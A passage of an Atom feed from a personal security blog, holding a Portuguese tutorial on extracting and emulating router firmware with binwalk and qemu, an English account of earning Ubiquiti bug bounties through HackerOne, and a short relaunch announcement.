  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/239719&quot;&gt;HackerOne Partial Report&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.ubnt.com/t5/EdgeMAX-Updates-Blog/EdgeMAX-EdgeRouter-software-security-release-v1-9-7-hotfix-3/ba-p/2054117&quot;&gt;UBNT Software Release Note&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="ubnt" /><category term="cve" /><summary type="html">UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Emulando binários dos firmwares</title><link href="http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html" rel="alternate" type="text/html" title="Embedded Hacking: Emulando binários dos firmwares" /><published>2018-02-19T00:00:00-03:00</published><updated>2018-02-19T00:00:00-03:00</updated><id>http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html">&lt;p&gt;Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o &lt;em&gt;DSL-100HN-T1-NV&lt;/em&gt;, &lt;a href=&quot;/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html&quot;&gt;extraído diretamente da memória flash&lt;/a&gt; do aparelho.&lt;/p&gt;

&lt;h2 id=&quot;o-dump-do-firmware&quot;&gt;O dump do Firmware&lt;/h2&gt;

&lt;p&gt;Na &lt;a href=&quot;/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html&quot;&gt;postagem anterior&lt;/a&gt; dessa série foi explicado quais elementos podem ser encontrados no firmware de um dispositivo embarcado. No firmware que extraímos, é possível identificar e extrair todas esses elementos separadamente e, então, analisá-los. Para isso vamos utilizar uma ferramente já bem conhecido pelo pessoal que faz engenharia reversa de firmware e perícia forense, o &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;introdução-ao-binwalk&quot;&gt;Introdução ao Binwalk&lt;/h2&gt;

&lt;p&gt;O &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt; é uma ferramente utilizada para análise, extração e engenharia reversa de firmwares. Ela possui dezenas de funcionalidades, desde a extração de firmware, disassembly de código (utilizando o &lt;a href=&quot;http://www.capstone-engine.org/&quot;&gt;capstone&lt;/a&gt;) e análise de entropia, muito útil para identificar se todo ou parte de um arquivo está criptografado ou compactado.&lt;/p&gt;

&lt;p&gt;Basicamente quando queremos saber o tipo de um arquivo desconhecido nós utilizamos o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; passando o arquivo como argumento. Esse comando possui uma base de assinatura (aka &lt;code class=&quot;highlighter-rouge&quot;&gt;magic numbers&lt;/code&gt;) de binários e utiliza essa base de assinatura para verificar o tipo do arquivo. Porém o comando file faz o match da assinatura no começo do arquivo, diferente da ferramenta binwalk.&lt;/p&gt;

&lt;p&gt;Além de ter uma base de assinatura mais específica e complexa, o binwalk percorre todo o binário procurando por formatos conhecidos, como bootloaders, sistemas de arquivos, imagens compactadas etc. Além disso, é possível extrair esse conteúdo (ao invés de fazer na mão com o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;dd&lt;/code&gt;) e, caso necessário, fazer esse processo de extração de maneira recursiva.&lt;/p&gt;

&lt;p&gt;Por exemplo, supomos que uma imagem de um firmware possui um sistema de arquivos compactado, e nesse sistema de arquivos possui um arquivo compactado com tar.gz. O binwalk com os argumentos certos iria identificar e extrair o sistema de arquivos principal e, então, identificar e extrair o arquivo tar.gz compactado.&lt;/p&gt;

&lt;h3 id=&quot;instalando&quot;&gt;Instalando&lt;/h3&gt;

&lt;p&gt;Na minha distribuição (ArchLinux) o binwalk já está disponível por padrão no repositório &lt;em&gt;community&lt;/em&gt;. Portanto é possível instalá-lo em um simples comando:&lt;/p&gt;
&lt;asciinema-player src=&quot;/assets/cast/binwalk-install.json&quot; rows=&quot;20&quot; preload=&quot;true&quot; poster=&quot;npt:0:11&quot;&gt;&lt;/asciinema-player&gt;

&lt;p&gt;Caso esteja utilizando alguma outra distribuição, verifique nos repositórios oficiais se a ferramenta está disponível. Caso contrário, a instalação a partir do github seria a melhor alternativa.&lt;/p&gt;

&lt;p&gt;Abaixo temos a lista completa de opções disponíveis na ferramenta:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Binwalk v2.1.1
Craig Heffner, http://www.binwalk.org

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...

Disassembly Scan Options:
    -Y, --disasm                 Identify the CPU architecture of a file using the capstone disassembler
    -T, --minsn=&amp;lt;int&amp;gt;            Minimum number of consecutive instructions to be considered valid (default: 500)
    -k, --continue               Don't stop at the first match

Signature Scan Options:
    -B, --signature              Scan target file(s) for common file signatures
    -R, --raw=&amp;lt;str&amp;gt;              Scan target file(s) for the specified sequence of bytes
    -A, --opcodes                Scan target file(s) for common executable opcode signatures
    -m, --magic=&amp;lt;file&amp;gt;           Specify a custom magic file to use
    -b, --dumb                   Disable smart signature keywords
    -I, --invalid                Show results marked as invalid
    -x, --exclude=&amp;lt;str&amp;gt;          Exclude results that match &amp;lt;str&amp;gt;
    -y, --include=&amp;lt;str&amp;gt;          Only show results that match &amp;lt;str&amp;gt;

Extraction Options:
    -e, --extract                Automatically extract known file types
    -D, --dd=&amp;lt;type:ext:cmd&amp;gt;      Extract &amp;lt;type&amp;gt; signatures, give the files an extension of &amp;lt;ext&amp;gt;, and execute &amp;lt;cmd&amp;gt;
    -M, --matryoshka             Recursively scan extracted files
    -d, --depth=&amp;lt;int&amp;gt;            Limit matryoshka recursion depth (default: 8 levels deep)
    -C, --directory=&amp;lt;str&amp;gt;        Extract files/folders to a custom directory (default: current working directory)
    -j, --size=&amp;lt;int&amp;gt;             Limit the size of each extracted file
    -n, --count=&amp;lt;int&amp;gt;            Limit the number of extracted files
    -r, --rm                     Delete carved files after extraction
    -z, --carve                  Carve data from files, but don't execute extraction utilities

Entropy Analysis Options:
    -E, --entropy                Calculate file entropy
    -F, --fast                   Use faster, but less detailed, entropy analysis
    -J, --save                   Save plot as a PNG
    -Q, --nlegend                Omit the legend from the entropy plot graph
    -N, --nplot                  Do not generate an entropy plot graph
    -H, --high=&amp;lt;float&amp;gt;           Set the rising edge entropy trigger threshold (default: 0.95)
    -L, --low=&amp;lt;float&amp;gt;            Set the falling edge entropy trigger threshold (default: 0.85)

Binary Diffing Options:
    -W, --hexdump                Perform a hexdump / diff of a file or files
    -G, --green                  Only show lines containing bytes that are the same among all files
    -i, --red                    Only show lines containing bytes that are different among all files
    -U, --blue                   Only show lines containing bytes that are different among some files
    -w, --terse                  Diff all files, but only display a hex dump of the first file

Raw Compression Options:
    -X, --deflate                Scan for raw deflate compression streams
    -Z, --lzma                   Scan for raw LZMA compression streams
    -P, --partial                Perform a superficial, but faster, scan
    -S, --stop                   Stop after the first result

General Options:
    -l, --length=&amp;lt;int&amp;gt;           Number of bytes to scan
    -o, --offset=&amp;lt;int&amp;gt;           Start scan at this file offset
    -O, --base=&amp;lt;int&amp;gt;             Add a base address to all printed offsets
    -K, --block=&amp;lt;int&amp;gt;            Set file block size
    -g, --swap=&amp;lt;int&amp;gt;             Reverse every n bytes before scanning
    -f, --log=&amp;lt;file&amp;gt;             Log results to file
    -c, --csv                    Log results to file in CSV format
    -t, --term                   Format output to fit the terminal window
    -q, --quiet                  Suppress output to stdout
    -v, --verbose                Enable verbose output
    -h, --help                   Show help output
    -a, --finclude=&amp;lt;str&amp;gt;         Only scan files whose names match this regex
    -p, --fexclude=&amp;lt;str&amp;gt;         Do not scan files whose names match this regex
    -s, --status=&amp;lt;int&amp;gt;           Enable the status server on the specified port

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;extração-do-firmware&quot;&gt;Extração do firmware&lt;/h2&gt;

&lt;p&gt;Para extrair o sistema de arquivos do firmware do nosso device, iremos executar o binwalk com o argumento -e (de &lt;code class=&quot;highlighter-rouge&quot;&gt;extract&lt;/code&gt;) no dump da memória flash, extraída por SPI na publicação anterior. Caso você esteja analisando algum outro firmware obtido por outro meio (ex: página de download do fabricante), o procedimento seria o mesmo.&lt;/p&gt;

&lt;p&gt;Abaixo é possível ver o processo de extração e o resultado obtido:&lt;/p&gt;
&lt;asciinema-player src=&quot;/assets/cast/binwalk-extract.json&quot; rows=&quot;20&quot; preload=&quot;true&quot; poster=&quot;npt:0:22&quot;&gt;&lt;/asciinema-player&gt;

&lt;p&gt;A imagem do firmware contém alguns elementos. Porém o que nos interessa a princípio é o sistema de arquivos Squashfs. O binwalk com o arquivo &lt;code class=&quot;highlighter-rouge&quot;&gt;-e&lt;/code&gt; já extrai e monta o sistema de arquivos, e ao acessar a pasta destino foi possível ver os arquivos do dispositivo. Nessa etapa já é possível comectar a procurar por alguns ítens interessantes, como por exemplo:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Serviços inicializando&lt;/li&gt;
  &lt;li&gt;Usuários não documentados&lt;/li&gt;
  &lt;li&gt;Chaves privadas ou certificados digitais&lt;/li&gt;
  &lt;li&gt;Alguma senha hardcoded de autenticação diferente das fornecidas na documentação&lt;/li&gt;
  &lt;li&gt;Etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;execução-de-binários&quot;&gt;Execução de Binários&lt;/h2&gt;

&lt;p&gt;Uma coisa muito interessante para se fazer é executar os binários disponíveis no firmware para uma análise dinâmica prévia. Isso pode ser útil para identificar vulnerabilidades e/ou simplesmente analisar o funcionamento de alguma aplicação legacy disponível no firmware.&lt;/p&gt;

&lt;p&gt;Para a execução de binários, temos que identificar a arquitetura do dispositivo. Geralmente a arquitetura é MIPS ou ARM, mas para tira a dúvida basta executar o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; em algum dos binários disponíveis no sistema de arquivos do firware.&lt;/p&gt;

&lt;p&gt;Abaixo o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; comprova que estamos trabalhando com um dispositivo com arquitetura MIPS:&lt;/p&gt;

&lt;asciinema-player src=&quot;/assets/cast/file-binary.json&quot; rows=&quot;10&quot; preload=&quot;true&quot; poster=&quot;npt:0:8&quot;&gt;&lt;/asciinema-player&gt;

&lt;p&gt;Para executar os binários, vamos utilizar uma combinação do &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu&lt;/code&gt;. O chroot irá alterar o root do sistema para o root do sistema de arquivos do firmware. Dessa forma todas as bibliotecas (também MIPS) e arquivos de configuração estarão disponíveis. Já o qemu irá executar o binário propriamente dito. Porém para isto o qemu deve ser compilado de maneira estática, para não depender de qualquer biblioteca que esteja fora do ambiente chroot. No archlinux existe um pacote AUR chamado &lt;a href=&quot;https://aur.archlinux.org/packages/qemu-user-static/&quot;&gt;qemu-user-static&lt;/a&gt;, que contém o QEMU compilado de maneira estática para diversas arquiteturas diferentes.&lt;/p&gt;

&lt;p&gt;Para executar os binários MIPS do firmware primeiramente copiamos o binário estático do qemu para arquitetura MIPS (no caso &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu-mips-static&lt;/code&gt;) para dentro do squashfs-root e, então, executamos o binário copiado dentro de um ambiente de chroot.&lt;/p&gt;

&lt;p&gt;O vídeo abaixo demostra a execução do binário MIPS de listagem de arquivos (ls):&lt;/p&gt;
&lt;asciinema-player src=&quot;/assets/cast/qemu-embedded-binary.json&quot; rows=&quot;20&quot; preload=&quot;true&quot; poster=&quot;npt:0:2&quot;&gt;&lt;/asciinema-player&gt;

&lt;h2 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h2&gt;

&lt;p&gt;Apesar dessa publicação ter sido razoavelmente simples, acredito que a utilização do &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu&lt;/code&gt; para análise dinâmica de binários seja extremamente útil. Porém, infelizmente, nem todos os binário executam com sucesso através desse método. Isso ocorre pelo motivo óbvio que o qemu não emula o hardware completo do nosso dispositivo embarcado. Entretanto a maioria das dificuldades conseguem ser contornadas utilizando alguns artifícios como uma melhoria no setup do ambiente (ex: montar o &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt; e o &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt;), seja mudando algum arquivo de configuração, seja rodando o binário com LD_PRELOAD para burlar algumas chamadas específicas de biblioteca (ex: acesso a &lt;code class=&quot;highlighter-rouge&quot;&gt;nvram&lt;/code&gt;) ou, no pior caso, fazendo um patch no binário em execução.&lt;/p&gt;

&lt;p&gt;Recomendo aos que estão acompanhando a série a praticarem com algum dispositivo que possuem ou a escolherem algum firmware na internet para seguir o processo. Caso tenham qualquer dúvida ou comentário basta entrar em contato ou utilizar os campos de comentário no final da página.&lt;/p&gt;

&lt;p&gt;Cheers,&lt;/p&gt;

&lt;p&gt;Maycon Vitali&lt;br /&gt;
Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="qemu" /><category term="mips" /><summary type="html">Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o DSL-100HN-T1-NV, extraído diretamente da memória flash do aparelho.</summary></entry><entry xml:lang="en"><title type="html">Talk is cheap. Show me the money!</title><link href="http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-02-03T00:00:00-02:00</published><updated>2018-02-03T00:00:00-02:00</updated><id>http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en</id><content type="html" xml:base="http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html">&lt;p&gt;The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.&lt;/p&gt;

&lt;h3 id=&quot;what-is-a-bug-bounty-program&quot;&gt;What is a Bug Bounty Program?&lt;/h3&gt;

&lt;p&gt;Bug Bounty programs are a good way to earn money and reporting vulnerabilities in a responsible way to the vendor/developer or to the company that uses it (and has implemented a Bug Bounty Program). The bounties can be your name in the hall of fame or money. And that is why is so fantastic.&lt;/p&gt;

&lt;p&gt;There are many companies that have Bug Bounty Programs like &lt;a href=&quot;https://pt-br.facebook.com/BugBounty/&quot;&gt;Facebook&lt;/a&gt;, &lt;a href=&quot;https://www.google.com/about/appsecurity/reward-program/&quot;&gt;Google&lt;/a&gt; or &lt;a href=&quot;https://technet.microsoft.com/pt-br/library/dn425036.aspx&quot;&gt;Microsoft&lt;/a&gt;. Moreover, there are platforms that join tens and hundreds of different companies and work like an intermediator. For example, we can mention the HackerOne platform or another companies that join bug bounty programs but are interested in reselling the vulnerabilities to other companies (or government) or to use it to protect specific security products.&lt;/p&gt;

&lt;h3 id=&quot;selection-criteria&quot;&gt;Selection Criteria&lt;/h3&gt;

&lt;p&gt;I have been following Bug Bounty reports that are published in &lt;a href=&quot;https://www.hackerone.com/&quot;&gt;HackerOne&lt;/a&gt; Platform and every time I see someone earning few dollars reporting a simple &lt;em&gt;XSS Reflected&lt;/em&gt; I always think the same: “Ouch! that could be me”. So I decided to roll up the sleeves and look for some luck playing with a program.&lt;/p&gt;

&lt;p&gt;In order to choose the program, I used the following criteria based on public reports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A Bug Bounty program with clear rules and clear scope definition.&lt;/li&gt;
  &lt;li&gt;A vendor with a good responsivity&lt;/li&gt;
  &lt;li&gt;A Bug Bounty program with a good average payout&lt;/li&gt;
  &lt;li&gt;A Bug Bounty program with a non-obscure scope (I want something accessible)&lt;/li&gt;
  &lt;li&gt;And, of course, something really fun.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;choosing-the-vendor&quot;&gt;Choosing the Vendor&lt;/h3&gt;

&lt;p&gt;As I was already studying embedded security (the &lt;code class=&quot;highlighter-rouge&quot;&gt;IoT hacking&lt;/code&gt; cliche), I found a vendor that fits like a glove, the &lt;a href=&quot;https://hackerone.com/ubnt&quot;&gt;Ubiquiti Networks&lt;/a&gt;. It has clean rules, a well-defined scope, good payment and being looking into the firmware for vulnerabilities would be great. Although H1 has another vendor with good bounties, the good point to choose UBNT was that it pays the bounty once the vulnerability is confirmed, while other vendors, after submitting to vendors we have to wait few days after the security patch.&lt;/p&gt;

&lt;h3 id=&quot;choosing-the-target&quot;&gt;Choosing the Target&lt;/h3&gt;

&lt;p&gt;The next step was to choose the target. After few researching with friends, I decided to buy online an &lt;a href=&quot;https://produto.mercadolivre.com.br/MLB-811540935-ubiquiti-edgerouter-x-er-x-5-portas-rj45-_JM?source=gps&quot;&gt;EdgeRouter X&lt;/a&gt;, a managed router with interesting features. The router (with the delivery service) cost me about $100.00, but I had in my mind that if I find a simple Cross-site Scripting vulnerability I will earn for about $150.00, and it will be enough to recover the value I paid (and a few profit).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I bought it on Wednesday, 30th May, and the device was delivered almost two weeks later, on 14th July, before a holiday.&lt;/p&gt;

&lt;h3 id=&quot;tests-and-results&quot;&gt;Tests and Results&lt;/h3&gt;

&lt;p&gt;I would like to make clear that the technical details will be only on another future post because the purpose of this publication is to report my experience and serve as an incentive to those who wish to join the same area.&lt;/p&gt;

&lt;p&gt;Ok. Let’s go..&lt;/p&gt;

&lt;p&gt;The day the router arrived, I had to work until late night, around 9 pm. Then I decided to sit on my research/study computer and take a look at the router’s web interface. And, of course, I did it already looking for some possibility (eg: my so precious XSS).&lt;/p&gt;

&lt;p&gt;By analyzing the HTTP messages, it was possible to identify &lt;strike&gt;(lucky guess!)&lt;/strike&gt; a vulnerability in which a Read-Only profile user (eg: operator) would be able to execute commands like &lt;em&gt;root&lt;/em&gt; on the device. This was a finding bigger than I was expecting, mainly because it was only in the first few minutes analyzing the web application of the router. However, without much hope, I was thinking that the flaw would not be as valuable because it requires a read-only account for successful exploitation. For this reason, I considered this vulnerability as a simple Privilege Escalation, rather than Remote Execution of Commands (RCE).&lt;/p&gt;

&lt;h3 id=&quot;writing-the-report&quot;&gt;Writing the Report&lt;/h3&gt;

&lt;p&gt;The key tip is: You must write the report as well as you can. It will significantly influence the response time and it can influence the reward of your finding.&lt;/p&gt;

&lt;p&gt;The main goal of the report must be describing the fault to make clear its impact, this will help the reproduction of the vulnerability. When the company’s analyst/consultant reads the report, as much faster they understand the error and can reproduce the vulnerability, faster it will go through screening and faster you will receive the long-awaited reward.&lt;/p&gt;

&lt;p&gt;It is important to make clear all that has been done to reproduce the vulnerability. If possible, you should restore the application (fresh install) and keep notes on every needed step to reproduce the vulnerability. In case of the embedded device, it is important to tell the version of the hardware and the version of the tested firmware.&lt;/p&gt;

&lt;p&gt;An example is a vulnerability that I had reported, where its exploitation was only possible on the first authentication on the web interface. I did not realize this detail while I was reporting the vulnerability and I had to exchange few messages with the vendor until we reached a common agreement and identified this condition to reproduce the vulnerability.&lt;/p&gt;

&lt;p&gt;Continuing …&lt;/p&gt;

&lt;p&gt;On Thursday night, I wrote the report as detailed as possible, explaining each step needed to reproduce the issue, and sent it to the vendor through HackerOne (after reviewing a few dozen times).&lt;/p&gt;

&lt;h3 id=&quot;the-first-reward&quot;&gt;The First Reward&lt;/h3&gt;

&lt;p&gt;When I woke up in the morning &lt;strike&gt; not so early &lt;/strike&gt;, I checked my emails on my cell phone as usual and I noticed that I already got two emails from HackerOne. My first thinking was the worst: “Is something missing in the process?”, “Did I forget to report something?”, “Is the report duplicated?” etc.&lt;/p&gt;

&lt;p&gt;The first email was that my report was triaged, which means that the vulnerability I reported was confirmed.&lt;/p&gt;

&lt;p&gt;I was satisfied and happy with the possible $ 250.00 that would be coming. Until I saw the second email saying that I had already been paid. That’s it! In less than 12 hours after I sent my first vulnerability report, it was confirmed and the reward was paid. But the best is still to come. Instead of the $ 250.00 that I was expecting, I was rewarded with $ 1,500.00, which rather than pay the investment in the EdgeRouter that I had bought, would allow me buying another 15 models alike.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;First vulnerability report&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;money-money-and-an-unexpected-invite&quot;&gt;Money, money and an unexpected invite(?)&lt;/h3&gt;

&lt;p&gt;Earning $ 1,500 in a fun way and only in a few minutes was more than enough to get me addicted. Do you remember it was a holiday? The result was I spent the complete holiday and the weekend practically only looking vulnerabilities on the device. The result was four more vulnerabilities reported to the vendor. However, unlike the first report, one of them was considered duplicated and the other three were rewarded in $150.00, $150.00 and $500.00. Probably it happened because of the needed to have user interaction and because the vulnerability has been identified in a beta version of the firmware.&lt;/p&gt;

&lt;p&gt;As I took a liking to the result but did not have much time available out on the weekends, I decided to calm down a bit and just study a little more during the weekends. But on June 15th I received a private message from Ubiquiti inviting me to test a beta device, the [EtherMagic] (https://store.ubnt.com/products/ethermagic). They told me that if I accepted the invite they would send a &lt;strong&gt;free kit&lt;/strong&gt;. This made me happy to realize the company’s recognition of my vulnerability research on their equipment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Invite&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dont-let-the-samba-die-its-a-brazilian-expression&quot;&gt;Don’t let the samba die (it’s a Brazilian expression)&lt;/h3&gt;

&lt;p&gt;While the new device did not arrive, I spent some time looking for new vulnerabilities on the [g]old EdgeRouter for another weekend and the result was that I found two more vulnerabilities. As I was a bit frustrated with the previous reward, I decided to go back to the last non-beta version of the firmware, and the result was interesting. Of the two findings I had reported, one of them made me $ 1,000 less poor and the other made me earn another $ 1,500.&lt;/p&gt;

&lt;p&gt;Let’s make some math: $ 1,500.00 from the first report, $150.00 + $150.00 + $500.00 from the second “pack” of reports (I burned a report as a duplicate), and then $2,500.00 more in two reports reported the following weekend. I already had earned $4,800.00 just looking for vulnerabilities in my free time. As one of my friends says: “Now you can pay some bills!”&lt;/p&gt;

&lt;h3 id=&quot;finally-it-arrives-oops&quot;&gt;Finally it arrives!! Oops…&lt;/h3&gt;

&lt;p&gt;After two weeks that the new device was posted, it finally arrived into my hands. At first, I was a bit worried about already opening it and going out soldering pinout to UART (I’ll talk about it in a future post) and end up breaking it. After all, if it breaks I could not just open the vendor online store and buy another. But as the device was beta, unfortunately, its support is very limited (maybe we can say it does not exist), and there is no version of its firmware on the vendor download page. Conclusion: I should extract the firmware directly from the device (I’ll also mention it in a future post) to get access to it and the running applications.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was late at night and I was reasonably tired of trying to get access to the device. However, with my hardware knowledge tending to zero, I started playing with its bootloader commands (U-Boot) and, in a miraculous and bad lucky way, I managed to brick with the FLASH memory of the device. #genius&lt;/p&gt;

&lt;p&gt;When it stopped responding and after the reboot, the led did not even rise. So I already predicted the worst. I only remembered a joke I always said about when the subject was playing with hardware: “I do not like to play with hardware because I don’t like to mess with things I can’t do a backup.” While my heart almost stopped beating, my savior was a friend who agreed to exchange his hardware with mine. So I could continue with the tests while he tries to solve my device problem directly with the engineers.&lt;/p&gt;

&lt;h3 id=&quot;talk-is-cheap-show-me-the-money&quot;&gt;Talk is cheap. Show me the money!&lt;/h3&gt;

&lt;p&gt;Instead of trying to do a bottom-up analysis (from firmware to application), I tried to change the modus operandi for a top-down investigation. That means that, I decided to follow the simpler path and started to use it and analyze the device with no access to the firmware in question. I looked for vulnerabilities only with what was accessible to me. The device implemented a specific protocol that was not even under HTTP, so for the analysis, I made a bit-brushing and a lot of Wireshark / tcpdump.&lt;/p&gt;

&lt;p&gt;Unfortunately, since this device is part of the Beta program, Ubiquiti did not authorize me to provide more details about the reports. But in a single weekend, I reported three critical vulnerabilities in the device, which yielded me $ 5,000 EACH.&lt;/p&gt;

&lt;p&gt;Unfortunately, After the payment of this last batch of rewards, the reward program for EtherMagic was frozen and it went out of the scope of the tests.&lt;/p&gt;

&lt;h3 id=&quot;general-balance&quot;&gt;General Balance&lt;/h3&gt;

&lt;p&gt;The summary of that month I was playing with Bug Bounties were 10 vulnerabilities reported, where one of them was duplicated and the another nine were rewarded with a total of $ 19,800.00:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also as a result of this, I finished 2017 in the fifth place in the “Ranking of Thanks” of Ubiquiti Networks:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ubiquiti Ranking - 2017&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Although it was not a technical article (I will let it to future posts), I hope it has been a good reading and that it had encouraged the InfoSec community to venture into these reward programs. Any questions or suggestions drop me your comment and, if possible, give me a “like” on the publication so that I can have a good visibility of what kind of subject is more interesting.&lt;/p&gt;

&lt;p&gt;Good hunting.&lt;/p&gt;

&lt;p&gt;Maycon Vitali&lt;br /&gt;
Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.</summary></entry><entry xml:lang="en"><title type="html">I’m back!!</title><link href="http://localhost:4000/hello-world/2018/01/28/im-back-en.html" rel="alternate" type="text/html" title="I'm back!!" /><published>2018-01-28T22:00:00-02:00</published><updated>2018-01-28T22:00:00-02:00</updated><id>http://localhost:4000/hello-world/2018/01/28/im-back-en</id><content type="html" xml:base="http://localhost:4000/hello-world/2018/01/28/im-back-en.html">&lt;p&gt;Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the &lt;a href=&quot;http://www.hacknroll.io&quot;&gt;Hack N’ Roll&lt;/a&gt; one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the &lt;a href=&quot;http://www.hacknroll.com&quot;&gt;old site&lt;/a&gt; to the new one.&lt;/p&gt;

&lt;p&gt;In this personal page, I intend to provide some material related to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Some research result&lt;/li&gt;
  &lt;li&gt;Some talks I gave&lt;/li&gt;
  &lt;li&gt;Methodology and study material&lt;/li&gt;
  &lt;li&gt;Some interesting tool I write&lt;/li&gt;
  &lt;li&gt;Tips and tricks related to InfoSec (OffSec, okay? haha)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As some people that know me already know, this site will have material related to the following subjects:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;General offensive security techniques&lt;/li&gt;
  &lt;li&gt;Memory corruption exploitation stuff&lt;/li&gt;
  &lt;li&gt;Protection bypass&lt;/li&gt;
  &lt;li&gt;Software reverse engineering&lt;/li&gt;
  &lt;li&gt;Hardware/embedded hacking and reverse engineering&lt;/li&gt;
  &lt;li&gt;Lockpicking&lt;/li&gt;
  &lt;li&gt;Web application hacking&lt;/li&gt;
  &lt;li&gt;Vulnerability reports&lt;/li&gt;
  &lt;li&gt;Information about personal projects related to InfoSec and the Hack N’ Roll&lt;/li&gt;
  &lt;li&gt;Bug Bounty (‘cause “Talk is cheap! Show me the money…”)&lt;/li&gt;
  &lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Unfortunately, the main language of this site will be Brazilian Portuguese. But I will try to rewrite all posts to English as fast I can. Feel free to send me any feedback about the content of this site, including subject, typos, misspelling etc.&lt;/p&gt;

&lt;p&gt;Let’s hack!&lt;br /&gt;
